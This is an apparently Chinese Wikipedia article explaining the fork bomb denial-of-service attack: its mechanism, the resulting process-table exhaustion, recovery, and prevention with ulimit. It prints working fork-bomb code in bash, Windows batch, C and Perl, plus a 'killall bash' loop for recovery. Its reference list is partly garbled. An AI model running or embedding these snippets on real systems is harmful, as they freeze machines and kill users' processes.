[Fork_bomb.svg](https://zh.wikipedia.org/wiki/File:Fork_bomb.svg "fig:Fork_bomb.svg")

**fork炸彈**（*fork
bomb*）在[计算机领域中是一种利用](https://zh.wikipedia.org/wiki/计算机 "wikilink")[系统調用](https://zh.wikipedia.org/wiki/系统調用 "wikilink")[fork](https://zh.wikipedia.org/wiki/Fork_\(操作系统\) "wikilink")（或其他等效的方式）進行的[阻斷服務攻擊](../Page/阻斷服務攻擊.md "wikilink")\[1\]。與[病毒與](../Page/病毒.md "wikilink")[蠕蟲不同的是](https://zh.wikipedia.org/wiki/蠕蟲病毒 "wikilink")，fork炸彈没有傳染性，而且fork炸彈會使有[进程](https://zh.wikipedia.org/wiki/进程 "wikilink")/[程序限制的](../Page/计算机程序.md "wikilink")[系统無法開起新工作階段](../Page/操作系统.md "wikilink")，對於不限制進程數的系统則使之停止回應\[2\]。以fork炸彈為代表的自我複制程式有時亦被稱為[wabbit](https://zh.wikipedia.org/wiki/wabbit "wikilink")。

## 原理与影响

fork炸弹以极快的速度创建大量进程（进程数呈以2为[底数的](https://zh.wikipedia.org/wiki/底数_\(对数\) "wikilink")[指数增长趋势](https://zh.wikipedia.org/wiki/冪運算 "wikilink")），并以此消耗系统分配予进程的可用空间使[进程表饱和](https://zh.wikipedia.org/wiki/行程控制表 "wikilink")，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止；但由于fork炸弹程序所创建的所有实例都会不断探测空缺的进程槽并尝试取用以创建新进程，因而即使在某进程终止后也基本不可能运行新进程。fork炸弹生成的子程序在消耗进程表空间的同时也会占用[CPU和](https://zh.wikipedia.org/wiki/CPU "wikilink")[内存](https://zh.wikipedia.org/wiki/内存 "wikilink")，从而导致系统与现有进程运行速度放缓，响应时间也会随之大幅增加，以致于无法正常完成任务，从而使系统的正常运作受到严重影响\[3\]。

除了恶意触发fork炸弹破坏的情况外，[软件开发中有时也会不慎在程序中嵌入fork炸弹](https://zh.wikipedia.org/wiki/软件开发 "wikilink")，如在用于监听[网络套接字并行使](https://zh.wikipedia.org/wiki/网络套接字 "wikilink")[客户端-服务器结构系统中服务器端职责的](../Page/主從式架構.md "wikilink")[应用程序中可能需要无限地进行](../Page/应用程序.md "wikilink")[循环](https://zh.wikipedia.org/wiki/循环_\(计算机编程\) "wikilink")（loop）与派生（fork）操作（类似下节示例程序所示），而在这种情况下[源代码内的细微错误就可能在测试中](../Page/源代码.md "wikilink")“引爆”fork炸弹。

## 示例

以下程序段就是由所作的在[類UNIX系统的](https://zh.wikipedia.org/wiki/類UNIX系统 "wikilink")[shell環境下觸發fork炸彈的shell](https://zh.wikipedia.org/wiki/shell "wikilink")[腳本代碼](https://zh.wikipedia.org/wiki/腳本語言 "wikilink")\[4\]，總共只用了13個字元（包括空格）：

``` bash
:(){ :|:& };:
```

注解如下：

``` bash
:()      # 定义函数,函数名为":",即每当输入":"时就会自动调用{}内代码
{        # ":"函數起始字元
    :    # 用递归方式调用":"函数本身
    |    # 並用管線(pipe)將其輸出引至...（因为有一个管線操作字元，因此會生成一個新的進程）
    :    # 另一次递归调用的":"函数
# 综上,":|:"表示的即是每次調用函数":"的時候就會產生兩份拷貝
    &    # 調用間脱鉤,以使最初的":"函数被關閉後為其所調用的兩個":"函數還能繼續執行
}        # ":"函數終止字元
;        # ":"函数定义结束后将要进行的操作...
:        # 调用":"函数,"引爆"fork炸弹
```

其中[函數名](https://zh.wikipedia.org/wiki/函數 "wikilink")“:”只是簡化的一例，實際上可以随意設定，一個較易理解（將函數名替換為“forkbomb”）的版本如下：

``` bash
forkbomb(){ forkbomb|forkbomb & } ; forkbomb
```

[Windows下則可以](https://zh.wikipedia.org/wiki/Windows "wikilink")[批次處理命令如下實作](https://zh.wikipedia.org/wiki/批次處理 "wikilink")：

``` dos
%0|%0
```

[POSIX標准下的](https://zh.wikipedia.org/wiki/POSIX "wikilink")[C與](https://zh.wikipedia.org/wiki/C語言 "wikilink")[C++的實作](../Page/C++.md "wikilink")：

``` c
#include <unistd.h>

int main()
{
  while(1)
    fork();
  return 0;
}
```

[Perl語言的實作](../Page/Perl.md "wikilink")：

``` perl
fork while fork
```

## “熄火”

在系统中成功“引爆”fork炸弹后，可重启来使系统恢复正常运行；而若要以手动的方法使fork炸弹“熄火”，那前提就是必须杀死fork炸弹产生的所有进程。为此我们可以考虑使用程序来杀死fork炸弹产生的进程，但由于这一般需要创建新进程，且由于fork炸弹一直在探测与占用进程槽与内存空间，因而这一方法不易实现，雖用`kill`命令杀死进程后，释放出的进程会被余下的fork炸弹线程所产生的新进程占用，但可以使用迴圈殺死所有進程，不過也會將無關的進程殺死

``` dos
for ((tmp=1;tmp<10;tmp++));do killall bash;done
```

在Windows下，用户可以退出当前用户会话的方式使系统恢复正常，但此法奏效的前提是fork炸弹是在该用户的特定会话内触发的。

## 预防

由於fork炸弹透過不斷的開新進程來癱瘓系統，一個防止其嚴重影響系統的方法就是限定一個使用者能夠創建的進程數的上限，在[Linux系統上](https://zh.wikipedia.org/wiki/Linux系統 "wikilink")，可以透過ulimit這個指令達到相應的效果，例如：
ulimit -Hu 30
這個指令可以限制每一個使用者最多只能創建30個進程，还可以通过修改配置文件/etc/security/limits.conf来限制可生成的最大进程数来避开这枚炸弹。而[FreeBSD系統的話系統管理者可以在](../Page/FreeBSD.md "wikilink")/etc/login.conf底下的設定檔進行相關的設定

## 参考资料

<references />

## 参见

  - [无限循环](https://zh.wikipedia.org/wiki/无限循环 "wikilink")
  - [Fork
    (操作系统)](https://zh.wikipedia.org/wiki/Fork_\(操作系统\) "wikilink")
  - [进程管理
    (计算机科学)](https://zh.wikipedia.org/wiki/进程管理_\(计算机科学\) "wikilink")
  - [邏輯炸彈](https://zh.wikipedia.org/wiki/邏輯炸彈 "wikilink")

[Category:阻斷服務攻擊](https://zh.wikipedia.org/wiki/Category:阻斷服務攻擊 "wikilink")
[Category:操作系统](https://zh.wikipedia.org/wiki/Category:操作系统 "wikilink")
[Category:计算机编程](https://zh.wikipedia.org/wiki/Category:计算机编程 "wikilink")

1.
2.
3.  :&
    };:|url=[http://www.cyberciti.biz/faq/understanding-bash-fork-bomb/|language=en|work=nixCraft](http://www.cyberciti.biz/faq/understanding-bash-fork-bomb/%7Clanguage=en%7Cwork=nixCraft)}}
4.